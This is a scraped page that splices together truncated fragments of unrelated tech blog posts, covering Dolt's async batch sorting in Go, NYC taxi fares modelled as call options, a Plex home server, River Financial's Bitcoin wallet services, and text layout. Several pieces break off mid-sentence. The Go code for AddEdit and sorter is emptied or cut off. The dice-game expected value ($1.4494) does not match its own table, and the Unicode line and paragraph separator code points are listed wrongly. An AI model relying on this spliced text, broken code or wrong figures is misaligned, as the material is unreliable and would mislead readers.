</span><span>true</span><span></span></p><p><span>18</span><span>  </span><span>supported_identity_providers</span><span>         </span><span>=</span><span> </span><span>[</span><span>"COGNITO"</span><span>]</span><span></span></p><p><span>19</span><span>  </span><span>explicit_auth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>20</span><span>    </span><span>"ALLOW_CUSTOM_AUTH"</span><span>,</span></p><p><span>21</span><span>    </span><span>"ALLOW_REFRESH_TOKEN_AUTH"</span><span>,</span></p><p><span>22</span><span>    </span><span>"ALLOW_USER_SRP_AUTH"</span><span>,</span></p><p><span>23</span><span>  </span><span>]</span><span></span></p><p><span>24</span><span></span><span>}</span></p></pre></div><p>In this example, we have not enabled an Identity Provider (IdP), so only username and password auth is accepted.

October 26, 2020 | https://www.dolthub.com/blog/2020-10-26-asynchronous-sorting-in-go/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-10-26-asynchronous-sorting-in-go/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>When we began working on <a href="https://doltdb.com/">Dolt</a> we made the decision to build on top of <a href="https://github.com/attic-labs/noms">Noms</a>. Noms
stores data in a content addressable <a href="https://en.wikipedia.org/wiki/Directed_acyclic_graph">DAG</a>, and has countless applications.  It was a great starting point for us to build
<a href="https://doltdb.com/">Dolt</a>, and it let us hit the ground running.  Once we had a working prototype of the product we began importing data.<br>
Every dataset we imported taught us something new about the product. It helped us find issues with our code and dependencies,
and it helped us understand the scale of data that we could handle.  At that time, doing an import with a few million
rows could be painfully slow. As I dove into the profile the majority of the time was spent sorting, and this is how I
fixed that.</p>

<p>Dolt stores tables in Noms, in a map, the details of which were covered by <a href="https://www.dolthub.com/team#aaron">Aaron Son</a>
in <a href="https://www.dolthub.com/blog/2020-04-01-how-dolt-stores-table-data/">this blog article</a>.  The TLDR is that a B-Tree
like structure, called a Prolly-tree, backs the map that stores our table data.  To efficiently edit our map,
we need to apply edits in order. </p>
<p>The guys at Attic Labs, who wrote Noms, wrote a really cool way to get data into a map with their
<a href="https://github.com/attic-labs/noms/blob/master/go/types/map.go#L46">streaming map</a> implementation. It takes a channel
as an argument which you stream keys and values to, and returns a channel which you can read the resulting map from.
It's pretty fast, and there is something about the interface that feels like <a href="https://en.wikipedia.org/wiki/Rob_Pike">Rob Pike</a> would love it. The gotchas are:</p>
<ol>
<li>You need to stream your data into the map in order.</li>
<li>It only works for new maps. You cannot use it to edit a map that already has data in it. </li>
</ol>
<p>In either of these cases you'll need to use a <code>MapEditor</code> which collects a list of changes that will be applied to the
map, and only after all the edits are collected, does it sort all the changes, and then apply them. Dolt may have been
the first Noms use case which needed to be able to support reading in billions and applying billions of map edits, so
this was likely the first time this case was optimized for.</p>

<p>Before they can be applied, the edits are read from some source into a list. During this time Dolt is IO bound, and there
are idle CPU cycles that could be used to decrease our sort time once all the data is available.</p>
<p>In order to take advantage of the up front time we need to use an algorithm where work done prior to having all of the
items results in improved sort times once you do have all the items.  In order to accomplish this, we accumulate edits
into batches and once a batch is full it is sent to a background worker routine which sorts it. Once all the edits have
been added, we wait for our workers to finish sorting in the background, and then merge sort the batches of sorted
edits.  This has the additional benefit of being highly parallelizable.  Each batch sort can run in a go routine,
and as we merge the batches, pairs of batches can be merged in separate routines as well.</p>

<h2>Refactoring Before we Start</h2>
<p>The first step in our implementation is to replace the slice accumulating the edits with an interface which can be swapped
in and out to make it easy to compare the existing performance and results with the new implementation. </p>
<div data-language="go"><pre><code>

<span>type</span> EditAccumulator <span>interface</span> <span>{</span>
	
	<span>AddEdit</span><span>(</span>k Value<span>,</span> v Value<span>)</span>

	
	
	<span>FinishedEditing</span><span>(</span><span>)</span> <span>(</span>EditProvider<span>,</span> <span>error</span><span>)</span>

	
	
	<span>Close</span><span>(</span><span>)</span>
<span>}</span>



<span>type</span> EditProvider <span>interface</span> <span>{</span>
	
	
	<span>Next</span><span>(</span><span>)</span> <span>(</span><span>*</span>KVP<span>,</span> <span>error</span><span>)</span>

	
	<span>NumEdits</span><span>(</span><span>)</span> <span>int64</span>
<span>}</span></code></pre></div>
<h2>Background Sorting of Batches</h2>
<p>Now that we know what we need to implement lets take a look at our new AddEdit implementation.  It's pretty straight
forward: we add our edits to a slice, and once the slice is full, we write that slice to a channel and create a new slice
to accumulate map edits into.</p>
<div data-language="go"><pre><code>
<span>func</span> <span>(</span>ase <span>*</span>AsyncSortedEdits<span>)</span> <span>AddEdit</span><span>(</span>k Value<span>,</span> v Value<span>)</span> <span>{</span>

<span>}</span></code></pre></div>
<p>Our <code>sortChan</code> is being read by a go routine running the function <code>sorter</code> which sorts it and writes the results to <code>resultsChan</code></p>
<div data-language="go"><pre><code><span>func</span> <span>sorter</span><span>(</span>in<span>,</span> out <span>chan</span> types<span>.</span>KVPSlice<span>)</span> <span>error</span> <span>{</span>

<p>We will accumulate edits until the point when <code>FinishedEditing</code> is called at which time we need to return an <code>EditProvider</code>
which is used to iterate over all the edits in sorted order.  We close our background batch sorting channel, <code>sortChan</code>,
sort any edits that are in the <code>accumulating</code> slice, and then wait for all background sorting to finish before calling
<code>mergeSortBatches</code>.</p>

<h2>Merging Sorted Batches</h2>
<p>We have a list of sorted batches, that we need to merge.  We need a way of grouping our batches into pairs. As you merge
N batches, pairwise, down to a single collection of sorted edits, it is possible that your batches vary in size wildly.
Say you have 9 batches of edits. Here are two ways they could be merged:</p>
<div data-language="text"><pre><code>10   10 10   10 10   10 10   10 3        3    10 10   10 10   10 10   10 10
 \  /    \  /    \  /    \  /   |          \  /    \  /    \  /    \  /   |
  20      20      20      20    |           13      20      20      20    10
  20      20      20      20    |           10      13      20      20    20
    \    /          \    /      |            \      /        \      /     |
     \  /            \  /       |             \    /          \    /      |
      40              40        |               23              40        20
      40              40        |               20              23        40
        \             /         |                 \            /          |
         ------+------          |                  ------+-----           |
               80               3                        43               40
                 \             /                           \             /
                  ------+------                             ------+------
                        83                                        83</code></pre></div>
<p>The first approach uses a naive merge order.  The second sorts by size between levels which results in more even batches being
grouped as you merge down each batch.  I don't believe there to be a measurable performance impact of either strategy,
but we opted to go with the more balanced approach.</p>

<p>Now that we have a strategy for pairing our batches we can get back to merging them into a single sorted collection.  We
spawn worker go routines to handle the merge operations up to some configurable limit.  Then we write our batch pairs
to a channel to be sorted, and close the channel once all the batches being merged have been written.  Then we will wait
for the results before doing it all over again for the next level of our merge tree.</p>

<p>The code presented here omits some error handling for clarity, and does not go into the details of
<a href="https://en.wikipedia.org/wiki/Merge_sort">merge sort</a> implementation, but the full source code can be found
<a href="https://github.com/dolthub/dolt/tree/master/go/store/types/edits">here</a>.</p>

<p>This video provides a visual representation of the old and new sorting strategies.  At the start of the video you can
see data being added, and after half a second we begin async sorting our first batch.  The process of adding and concurrently
sorting batches asynchronously continues for about 5 seconds until all the data is available.  It is at this time that the
old model begins sorting it's data, and then at 6 seconds all of our batches are sorted and we begin merging.  The new
model completes in about 8 seconds, and the old is done after 15.</p>

<p>While the visualization helps us see what's going on, they may not represent real world benchmarks.  On small sets of
changes (small being less than 1 batch), our new methodology is identical to the old.  For change sets where the number
of edits is just slightly more than one the additional parallelism has a small negative performance impact.  After that
the performance impacts are very positive.  Benchmarking 10 million edits gave the following results on average:</p>
<ul>
<li>
<p>Async Batch Sorting with Merge</p>
<ul>
<li>Time to add the items: 7.52</li>
<li>Time to sort once all items are added: 3.16</li>
</ul>
</li>
<li>
<p>sort.Stable once all items are added:</p>
<ul>
<li>Time to add the items: 8.97</li>
<li>Time to sort once all items are added: 32.96</li>
</ul>
</li>
</ul>
<p>Roughly a 10x performance improvement in the sort time, meant that Dolt users are able to get data into a table more
quickly.  Another interesting improvement was in the amount of time needed …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Every cab I have ever ridden has been complaining about how hard it is to make
ends meet as a driver. The public is generally quick to blame unfair competition
from the likes of Uber. However, additional forces are also to blame.</p><p>Going through more than 10 years worth of NYC taxi data, I analyse how the
antiquated meter system impacts the livelihood of NYC cabbies by drawing an
analogy with stock options trading. Interestingly, this approach allows us to
show that drivers have progressively been worse-off, independently of
competition from Uber.</p><p>In order to do so, we have loaded a dataset into our database QuestDB. This
dataset includes over 1.6 billion taxi rides, 700 million FHV rides (Uber, Lyft
etc), and 10 years of weather and gas prices data.</p><p>A few of months ago, I was putting together data for QuestDB's demo that we
shared on <a href="https://news.ycombinator.com/item?id=23616878" target="_blank" rel="noopener noreferrer">ShowHN</a>.</p><p>It has been a while since I left derivatives trading, and was not expecting to
end up writing about options pricing. Much to my surprise, the economics of a
taxi meter are very similar to options. This provides an interesting perspective
into the fate of taxi drivers.</p><h2>The economics of the taxi meter</h2><p>Most rides are priced using the
<a href="https://www1.nyc.gov/site/tlc/passengers/taxi-fare.page" target="_blank" rel="noopener noreferrer">standard meter system</a>.
The meter is a machine, which calculates the price of a ride based on inputs
such as time, speed, and distance. Additionally, it adds taxes, tolls and
surcharges depending on a variety of factors such as the route taken or the time
of the day.</p><p>Most of the driver's earnings come from the <code>fare</code>, which consists of a
<code>flat fare</code> $2.50 for entering the cab, and a <code>variable fare</code>. The variable
fare is a function of speed, time and distance. It is calculated as follows:</p><ul><li>When the cab drives above 12mph, $2.50 per mile</li><li>Otherwise, $0.50 per minute</li></ul><p>This post focuses on the variable fare, i.e the output of the meter excluding
the $2.50 start fee and extras. To be able to compare rides with one another,
we normalize it as an <code>hourly rate</code> of driving a customer around.</p><h2>Modelling variable earnings for taxi drivers</h2><p>Let's assume a cab is driving a customer at a constant speed during one hour. At
the end of the hour, the driver can expect to pocket <code>variable earnings</code> of:</p><ul><li>$30 if they drove below 12mph ($0.50 a minute)</li><li>$2.50 x their average speed if they drove above 12mph</li></ul><p>Let's plot the hourly earnings in function of speed. This instantly reminds me
of an old friend: call options!</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed.png"><p>Rewriting the fare formula as follows, we recognize the call option formula
<code>Max(0, S-K)</code>.</p><p><code>Hourly Fare = 30 + max(0, Speed - 12)</code></p><p>Interestingly, the above notation breaks down the hourly variable fare into two
components.</p><ul><li>A <code>guaranteed</code> component <code>30</code>: whenever driving a customer, a cab will make at
least $30 an hour.</li><li>An <code>optional</code> component <code>max(0, Speed - 12)</code>: driving customers faster earns
the driver more.</li></ul><p>Graphically, the breakdown between <code>guaranteed</code> and <code>optional</code> fare components
look like the below:</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed broken down between fixed and variable" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed-breakdown.png"><p>There is a reason for this system. It is designed to align the interests of
drivers and riders:</p><ul><li>The <code>guaranteed</code> part makes discourages riders from making the driver wait and
ensures they are paid for their time.</li><li>The <code>optional</code> part discourages drivers from purposefully taking customers
through traffic.</li></ul><p>Let's try to quantify the value of the optional part by using options pricing
methods in order to study the incentive for drivers.</p><h2>A simple approach to options pricing</h2><p>This post isn’t meant as an essay in financial mathematics (far from it).
However, before we continue, it is useful to understand what makes options
valuable. Buying an option is like paying to play a game with a monetary payout
contingent on some <code>variable</code>.</p><p>As an example, think of a dice game. If the die value (our variable) is below 2,
you receive 0. Otherwise, you receive the difference between that value and 2.
In financial markets, the threshold of 2 is known as the <code>strike price</code> and is
denoted K.</p><p><strong>You have to pay a fee to play this game. How much are you ready to pay?</strong></p><p>To find out, we need to calculate the expected value of a game. This is easy
since we know all <code>possible outcomes</code> and their
<code>respective probabilities of occurrence</code>. We can write these in the table below:</p><table><thead><tr><th>Dice value</th><th>Probability</th><th>Payout</th><th>Weighed payout</th></tr></thead><tbody><tr><td>1</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>2</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>3</td><td>16.66%</td><td>1</td><td>0.1666</td></tr><tr><td>4</td><td>16.66%</td><td>2</td><td>0.3332</td></tr><tr><td>5</td><td>16.66%</td><td>3</td><td>0.4998</td></tr><tr><td>6</td><td>16.66%</td><td>4</td><td>0.6664</td></tr></tbody></table><p>By summing all the potential payouts weighed by their probability, we compute
the expected value of playing this game: $1.4494.</p><ul><li>If we pay less to play the game, we will make money over time.</li><li>If we pay more, we lose in the long run.</li></ul><p>This example shows that in its simplest form, the value of an option is equal to
the product of the payout profile and the associated probability distribution
when the option expires. Let’s visualize this by plotting the values for our
game in the following chart:</p><img alt="A chart showing the outcome profile of the dice game and the corresponding probabilities and probability-weighed expected payout values" src="https://questdb.io/img/blog/2020-10-16/die-game-payout-profile.png"><p>where:</p><ul><li>The white dashed line represents the possible (discrete) payouts for the game.</li><li>The cyan dotted line is the probability for each outcome (dice value) to
occur. It is a straight line at 16.66% since each of the 6 values is
equiprobable.</li><li>The coloured area is the product of the first two lines. Its total surface is
the value of our option.</li></ul><p>Of course, this is very simplified. I omit time value, which is the idea that
you (almost) always wish you could hold the option for longer. The reason time
value exists has to do with the asymmetric payoff profile: there is more to win
than to lose by waiting a little longer. Also, in real life, outcomes are rarely
equiprobable. For example, stock prices are represented as a log-normal
distribution. Nevertheless, this example gives a good introduction to calculate
the value of an option.</p><p>Now, since we saw that speed is the main driver behind the variable fare, we
should attempt to build a representation of speed distribution in order to
estimate the option value.</p><h2>Modelling cabs speed and option value</h2><p>This can be done using a log-normal distribution, which is analogous to the
normal distribution, but cannot be negative. This fits our situation well since
cabs can only drive above 0mph.</p><p>The log-normal distribution requires two parameters:</p><ul><li>the <code>mean</code>, i.e a driver's expected average speed for a given hour.</li><li>the <code>standard deviation</code>, a measure of how much the achieved speed is likely
to deviate from the mean.</li></ul><p>If we overlay the log-normal distribution to the option payoff, we can see the
option value below as the product of the two surface areas. As you can see, the
log-normal distribution is skewed to the left and the mode (the highest point on
the distribution, at around 10 mph) is lower than the mean (13 mph in the
above).</p><img alt="A chart of call option payoff with the corresponding probability and weighed value area as overlay" src="https://questdb.io/img/blog/2020-10-16/option-payoff-probability-value.png"><p>We can play with our two parameters to get a grasp on the pricing dynamics. Here
is how the average speed changes the distribution and expected option value:</p><img alt="A chart showing how distribution of outcomes and value change with the expected mean" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-avg.png"><p>And here is the effect of standard deviation:</p><img alt="A chart showing how distribution of outcomes and value change with the standard deviation" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-stdev.png"><p>We can see that a higher mean and a higher standard deviation result in higher
option value. In short, this means that it is in the drivers' best interests to</p><ul><li>drive faster;</li><li>deviate for the mean, for example by taking risks.</li></ul><p>Now, to be clear, I don't mean that they should drive recklessly, but rather
that they should attempt "risky" routes, which could either save a lot of time,
or otherwise be a disaster.</p><p>In traditional finance, the sensitivities to input parameters, which we have
introduced above are called the “Greeks”. These are measures of risk named
(mostly) after Greek letters. They are used to evaluate and manage the risk of
options portfolios. Here are the two greeks respective to the mean and standard
deviation:</p><ul><li>The <code>delta</code>, change of option value relative to change of the mean</li><li>The <code>vega</code>, change of value relative to the change of standard deviation (aka
volatility).</li></ul><p>These are "first order" greeks, which means they directly affect the option
value. There are more greeks, of higher order, which affect the option value
indirectly. As example, the <code>vanna</code> is a second-order greek which measures how
much the delta (first order greek) of an option changes when volatility changes.</p><h2>Traffic increase has cost a great amount to taxi drivers</h2><p>Let’s first look at the average speed over time.</p><p>The NYC taxi dataset gives us the distance calculated by the meter, the pickup
timestamp, and the drop-off timestamp. Using QuestDB, we can derive the duration
of each ride as the difference between the two timestamps and divide the
distance by the duration, to calculate the average speed.</p><p>With <code>SAMPLE BY</code>, I compute the average results for monthly intervals and plot
it below. Over 10 years, the average speed dropped significantly from 13.3 to
9.7mph (almost 30%!).</p><img alt="A chart showing the evolution of the average cab driver speed over time and how it consistently dropped below the threshold" src="https://questdb.io/img/blog/2020-10-16/average-speed-over-time.png"><p>This number is a simplification since it assumes constant speed and no idle
time. However, it is useful to calculate a lower-bound for earnings as follows.</p><p><code>Min Hourly Variable Fare = Max($30, Avg(speed) * $2.5)</code></p><p>Similarly, we can estimate the upper bound of a driver’s hourly earnings in a
theoretical world where drivers are either idle or accelerate instantly from 0
to the speed limit of 25mph. This is how the maximum potential fare could be
calculated:</p><p><code>Max potential hourly variable fare = Distance component + Idle component</code></p><p><code>Distance component = Average ride distance * $2.50 / Average ride duration (hours)</code></p><p>and</p><p><code>Idle component = (25 - Average ride distance)/25mph * 60min * $0.50</code></p><p>Lastly, we can calculate the actual average variable fare over time as follows.</p><p><code>Actual Hourly Variable Fare =avg(fare_amount - $2.50) / avg(duration_hours) </code></p><p>Here is what the three metrics look like over time (note we started the plot in
September 2012 since cab prices were increased in August 2012. Interestingly,
the average minimum variable fare has dropped over time and is now hitting a
floor.</p><img alt="A chart showing the evolution of the average cab driver potential fare range against the actual average fare" src="https://questdb.io/img/blog/2020-10-16/potential-average-fare-range.png"><p>Now that we have the average speed, we can use the standard deviation to model
the speed distribution. By feeding the historical mean and standard deviations
into a log-normal distribution model, we can compute the following percentiles.
For the vast majority of rides, drivers can expect to average below 12mph.</p><img alt="A chart showing the evolution of the distribution of NYC cab drivers' average speed over time" src="https://questdb.io/img/blog/2020-10-16/distribution-speed-over-time.png"><p>To sum up, the following chart shows how the economics have changed over time.
We can see how this damaged the option value for drivers, mostly as a …</p></section></div>

<p>Not much to this. I’ve set up a Plex server on a 2011ish MacBook air. This server is also responsible for hosting some homemade services on my local network.</p>
<p>Eventually I’d like to get it working with some sort of attached storage, but at the moment I’m using the MacBook’s HD which is relatively meager once you start filling up the HD with movies. I don’t need much though, since the main purpose is providing my kids with better educational content than is offered on Netlix / Prime / Hulu, as well as allowing us to eliminate our Disney+ subscription. The kids watch the same movies over and over again (he said as he cued up Olaf’s Frozen Adventure for the 10,000th time).</p>
<p>Warning: It isn’t a fast process, at least not on an old-ass MacBook. Doing a full season of a TV show takes forever since FFMPEG goes through line by line.</p>
<p>Warning: This appends <code>.mp4</code> to the filename, meaning <code>some-movie.mkv</code> becomes <code>some-movie.mkv.mp4</code>. I’m working on a bulk file renaming tool to run afterward to format the titles into the Plex naming scheme (<code>"MASH s01e09"</code>).</p>

                    <p>-- by <a href="https://twitter.com/philipglazman">Philip Glazman</a>, Software Engineer</p><h2 id="introduction">Introduction</h2><p><a href="https://river.com/">River Financial​</a> specializes in Bitcoin brokerage and custody services. Core to our operations is our infrastructure enabling us to custody and transact Bitcoin securely and at scale on behalf of our clients.</p><p>When starting the company, there was no off-the-shelf Bitcoin software solution that was capable of powering the product we were building. We needed a Bitcoin wallet service with the following traits:</p><ol><li>Capable of watching and rescanning millions of wallets, each with many thousands of scripts</li><li>Capable of interfacing with heterogeneous set of signers (single and multisig)</li><li>Flexible enough to upgrade quickly as protocol improves (Schnorr, Taproot, etc.)</li><li>Capable of interfacing cleanly with monitoring and security tooling</li><li>Has a clean, reliable API that is flexible enough to serve internal software services that power a quickly changing Bitcoin financial services institution</li><li>Can generate transactions for Lightning Network channel management</li><li>Modular enough to physically isolate highly sensitive components (e.g. signers)</li></ol><p>Historically, Bitcoin software built for exchanges and brokerages - which we refer to as <em>enterprise Bitcoin software</em> - has been proprietary and severely lags consumer Bitcoin software. This is evidenced by the multi-year delays between network protocol upgrades and support from even the <a href="https://bitcoinops.org/en/compatibility/">largest exchanges</a>. Many companies also have the disadvantage of needing to support arbitrary numbers of cryptocurrencies, preventing them from optimizing their infrastructure for Bitcoin.</p><p>At River we decided to reimagine what Bitcoin infrastructure could look like and built what we believe is the world's best enterprise Bitcoin software from the ground up. This post goes into the details of our Bitcoin infrastructure, the design decisions we made, and what we learned along the way. &nbsp;</p><p>Our Bitcoin architecture consists of three main components:</p><ol><li><strong>Walletd</strong>: A service responsible for maintaining <a href="https://river.com/learn/terms/u/utxo/">UTXO</a> ownership data for an arbitrary number of wallets</li><li><strong>Signerd</strong>: A signer responsible for hot private key material</li><li><strong>Indexd</strong>: An index that maintains a view of the current state of the Bitcoin network</li></ol><p>Written in the Go language, these components are services with singular responsibilities and ownership of local data, communicating via a RabbitMQ AMQP message broker. We also run Bitcoin Core nodes through which we interact with the public Bitcoin network. Indexd talks directly to a Bitcoin Core node (see diagram below).</p><figure><img src="https://blog.river.com/content/images/2020/10/image-1.png" alt="" srcset="https://blog.river.com/content/images/size/w600/2020/10/image-1.png 600w, https://blog.river.com/content/images/2020/10/image-1.png 980w" sizes="(min-width: 720px) 720px"><figcaption>River Bitcoin Architecture</figcaption></figure><p>Enterprise bitcoin infrastructure is primarily responsible for observing the state of the blockchain, updating internal systems based on changes to that state, and contributing valid transactions to the network. A transaction is an object that contains information on how bitcoin is being spent. When a client sends Bitcoin to their River deposit address, we will see a transaction on the network creating a new output owned by River wallets. When a client withdraws Bitcoin, Walletd attempts to create a valid transaction with an output that the withdrawal recipient will own. Ownership of an output is defined by the scriptPubKey, or locking script, that sets the rules for how the bitcoin can be spent. The various addresses one sees, such as P2PKH (beginning with 1) or P2WSH (beginning with bc1), are different ways to lock bitcoin.</p><h2 id="transaction-lifecycle">Transaction Lifecycle</h2><p>Describing the standard transaction lifecycle can help illustrate how our Bitcoin infrastructure works as a whole. Typically, a Bitcoin transaction will first be detected by our system when it enters one of our nodes’ mempools, a local set of unconfirmed transactions. A transaction can stay in the mempool until it is either invalid, confirmed, or is evicted due to elapsed time or space constraints. Although some transactions do not enter the mempool before they are included in a block because they were sent to a miner directly, most transactions use the mempool to signal willingness for block inclusion. </p><p>Upon detection, <strong>Indexd</strong> parses the transaction and serializes relevant information for persistence. We persist all transactions that have occurred in the Bitcoin blockchain and network in a PostgreSQL database. This allows us to quickly query for transactions (via txid), scripts (scriptPubKey), and outpoints (txid:output). Using the message broker, our services use events to communicate new changes to the state of a transaction. Transaction detection in the mempool is an event that <strong>Indexd</strong> will subsequently publish to <strong>Walletd</strong>. The wallet parses the message and updates the state of UTXOs and scripts accordingly.</p><h2 id="system-components">System Components</h2><p>There are several events that the system is prepared to handle from the network including new transactions, blocks, rejected transactions, and block reorganizations.</p><p>A critical feature of this system is the persistence and ordered property of messages which flow through the AMQP message-broker. Given that we can always assume a new block will be parsed approximately every ten minutes, we do not need to optimize for scale or throughput. There is also an upper limit for compute resources for each block. Instead, we optimize for availability and reliability.</p><p>The ordering of state changes matters in the context of Bitcoin because a transaction can become detected in the mempool, confirmed in a block, orphaned, no longer valid, or evicted from the mempool. A guarantee of our message-broker is the ordering of messages. This is an especially useful property when block reorganizations happen. </p><p>When River Financial detects a transaction in our mempool, Indexd will parse the transaction and save the new <a href="https://river.com/learn/terms/u/utxo/">unspent transaction outputs</a> (UTXOs), scripts, and spent outpoints. It emits a message to Walletd with the new state of this particular transaction. Outlined below are some states that a transaction can experience within the course of its lifetime:</p><p><strong>Transaction Accept</strong></p><figure><img src="https://blog.river.com/content/images/2020/10/image-2.png" alt=""><figcaption>Transaction Accept</figcaption></figure><p>A transaction is accepted into the mempool. This transaction is waiting for block inclusion. A River client will see a pending transaction.</p><p><strong>Transaction Confirmation</strong></p><figure><img src="https://blog.river.com/content/images/2020/10/image-3.png" alt=""><figcaption>Transaction Confirmation</figcaption></figure><p><strong>Transaction Rejection</strong></p><p>A transaction is confirmed in a block. Due to the risks of block reorganization, River does not consider the transaction to be in a final confirmed state until the confirmed block has a certain depth (e.g. 6 blocks).</p><figure><img src="https://blog.river.com/content/images/2020/10/image-4.png" alt=""><figcaption>Transaction Rejection</figcaption></figure><p><strong>Transaction Un-Confirmation</strong></p><p>A transaction can be rejected for a number of reasons. In this example, the transaction is evicted from the mempool. Though the transaction can appear in a block at a later time, we mark the transaction as rejected. A double-spend is another form of transaction rejection that can occur.<br></p><figure><img src="https://blog.river.com/content/images/2020/10/image-5.png" alt=""><figcaption>Transaction Un-Confirmation</figcaption></figure><p>A transaction can be unconfirmed during a block reorganization. When this happens, the transaction is no longer in a block and the transaction lives in the mempool until a new valid block can be found. This particular state can be short-lived, or lead to transaction rejection should a double-spend occur.</p><p>Walletd is a service with many wallets that each have their own set of scripts and UTXOs. Each wallet is defined by a wallet descriptor that creates the scope and script semantics that the wallet is expected to follow. Walletd uses an interface to communicate with different signers and does not contain any key material. As a result, the service can only maintain watch-only wallets. Avoiding key material inside the Walletd process allows us to have a diverse set of signers isolated by hardware and software.</p><p>At the root of each wallet is the <a href="https://github.com/bitcoin/bitcoin/blob/master/doc/descriptors.md">Output Script Descriptor </a>language, authored by Pieter Wuille, which is also used in the Bitcoin Core wallet. The descriptor language helps us describe wallets in a maintainable and expressive way that is interoperable with other wallet software. Our <a href="https://bitcoinops.org/en/river-descriptors-psbt/">Field Report</a> with Bitcoin Optech goes into further detail on the rationale behind River’s choice to use descriptors. With a wallet descriptor, Walletd can generate the appropriate scripts and addresses. <br></p><figure><img src="https://blog.river.com/content/images/2020/10/image-6.png" alt="" srcset="https://blog.river.com/content/images/size/w600/2020/10/image-6.png 600w, https://blog.river.com/content/images/size/w1000/2020/10/image-6.png 1000w, https://blog.river.com/content/images/2020/10/image-6.png 1198w" sizes="(min-width: 720px) 720px"><figcaption>wallet descriptor</figcaption></figure><p>Descriptors ensure interoperability and reduce the complexity for creating new wallets. Before this standard, proprietary methods were used to pass the information for what constitutes a wallet. With Walletd, there is a straightforward API method that can be reduced to providing a single descriptor.</p><p>Walletd is designed to scale to millions of wallets, as each wallet will have different use-cases. In our enterprise wallet, we maintain visibility of cold wallets and hot wallets. Our cold wallets are bound to multi-signature P2WSH script generation while our hot wallets use the highly available P2WPKH script. In addition to differing script semantics, each wallet has different policies with regards to spend eligibility and other properties. A hot wallet servicing withdrawals will have different policies than a wallet responsible for creating funding transactions on the Lightning Network.</p><p>Upon detection of a transaction, Walletd can associate one of the outputs’ <a href="https://river.com/learn/terms/s/scriptpubkey/">scriptPubKeys</a> with a script belonging to a wallet descriptor. A scriptPubKey is the locking script that contains the semantics on how to spend Bitcoin. When processing a transaction, Walletd loops through each output in a transaction and checks its set of scripts for any matches. On a match, the output is a deposit to one of the wallets in Walletd. The state machine notices the new UTXO associated with the script and emits balance update event messages to any Walletd consumers. </p><p>As soon as the UTXO satisfies our spending eligibility requirements, Walletd can create a transaction using the new outpoint. Throughout the transaction creation process, we use Partially Signed Bitcoin Transactions (PSBTs), a serialization standard for describing unsigned transactions proposed in BIP174. Adopting this standard reduces complexity and maintains interoperability with other wallets. Most …</p></div></section></article></div></div></div>

      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I love text layout, and have been working with it in one form or other for over 35 years. Yet, knowledge about it is quite arcane. I don’t believe there is a single place where it’s all properly written down. I have some explanation for that: while basic text layout is very important for UI, games, and other contexts, a lot of the “professional” needs around text layout are embedded in <em>much</em> more complicated systems such as Microsoft Word or a modern Web browser.</p>

<p>A complete account of text layout would be at least a small book. Since there’s no way I can write that now, this blog post is a small step towards that – in particular, an attempt to describe the “big picture,” using the conceptual framework of a “loose hierarchy.” Essentially, a text layout engine breaks the input into finer and finer grains, then reassembles the results into a text layout object suitable for drawing, measurement, and hit testing.</p>

<p>The main hierarchy is concerned with laying out the entire paragraph as a single line of text. Line breaking is also important, but has a separate, parallel hierarchy.</p>

<h2 id="the-main-text-layout-hierarchy">The main text layout hierarchy</h2>

<p>The hierarchy is: paragraph segmentation as the coarsest granularity, followed by rich text style and BiDi analysis, then itemization (coverage by font), then Unicode script, and shaping clusters as the finest.</p>

<p><img src="https://raphlinus.github.io/assets/layout_pyramid.svg" alt="diagram of layout hierarchy"></p>

<h3 id="paragraph-segmentation">Paragraph segmentation</h3>

<p>The coarsest, and also simplest, segmentation task is paragraph segmentation. Most of the time, paragraphs are simply separated by newline (U+000A) characters, though Unicode in its infinite wisdom specifies a number of code point sequences that function as paragraph separators in plain text:</p>

<ul>
  <li>U+000A LINE FEED</li>
  <li>U+000B VERTICAL TAB</li>
  <li>U+000C FORM FEED</li>
  <li>U+000D CARRIAGE RETURN</li>
  <li>U+000D U+000A (CR + LF)</li>
  <li>U+0085 NEXT LINE</li>
  <li>U+2008 LINE SEPARATOR</li>
  <li>U+2009 PARAGRAPH SEPARATOR</li>
</ul>

<p>In rich text, paragraphs are usually indicated through markup rather than special characters, for example <code>&lt;p&gt;</code> or <code>&lt;br&gt;</code> in HTML. But in this post, as in most text layout APIs, we’ll treat rich text as plain text + attribute spans.</p>

<h3 id="rich-text-style">Rich text style</h3>

<p>A paragraph of rich text may contain <em>spans</em> that can affect formatting. In particular, choice of font, font weight, italic or no, and a number of other attributes can affect text layout. Thus, each paragraph is typically broken into a some number of <em>style runs,</em> so that within a run the style is consistent.</p>

<p>Note that some style changes don’t <em>necessarily</em> affect text layout. A classic example is color. Firefox, rather famously, does <em>not</em> define segmentation boundaries here for color changes. If a color boundary cuts a ligature, it uses fancy graphics techiques to render parts of the ligature in different color. But this is a subtle refinement and I think not required for basic text rendering. For more details, see <a href="https://gankra.github.io/blah/text-hates-you/">Text Rendering Hates You</a>.</p>

<h3 id="bidirectional-analysis">Bidirectional analysis</h3>

<p>Completely separate from the style spans, a paragraph may in general contain both left-to-right and right-to-left text. The need for bidirectional (BiDi) text is certainly one of the things that makes text layout more complicated.</p>

<p>Fortunately, this part of the stack is defined by a standard (<a href="http://www.unicode.org/reports/tr9/">UAX #9</a>), and there are a number of good implementations. The interested reader is referred to <a href="https://www.w3.org/International/articles/inline-bidi-markup/uba-basics">Unicode Bidirectional Algorithm basics</a>. The key takeaway here is that BiDi analysis is done on the plain text of the entire paragraph, and the result is a sequence of <em>level runs,</em> where the level of each run defines whether it is LTR or RTL.</p>

